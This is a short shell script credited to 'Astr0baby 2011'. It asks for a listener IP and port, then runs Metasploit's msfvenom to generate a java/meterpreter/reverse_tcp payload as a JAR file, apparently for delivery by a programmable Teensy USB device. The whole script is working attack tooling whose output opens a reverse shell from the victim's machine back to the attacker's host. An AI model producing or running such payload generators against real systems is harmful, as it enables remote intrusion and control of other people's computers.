clear  
echo "************************************************************"
echo "    Automatic  shellcode generator - FOR METASPLOIT         "
echo "                  By Astr0baby 2011                         "
echo "        TESTING FOR OSX 32bit tested on 10.6                "  
echo "    For Automatic Teensy programming and deployment         "
echo "************************************************************"
echo -e "What IP are we gonna use ?  \c"
read IP 
echo -e "What Port Number are we gonna listen to? : \c"
read port
./msfvenom  -p   java/meterpreter/reverse_tcp  LHOST=$IP LPORT=$port EXITFUNC=thread R  > test.jar  
mv test.jar ShellCode
echo "test.jar generated in ShellCode folder..."
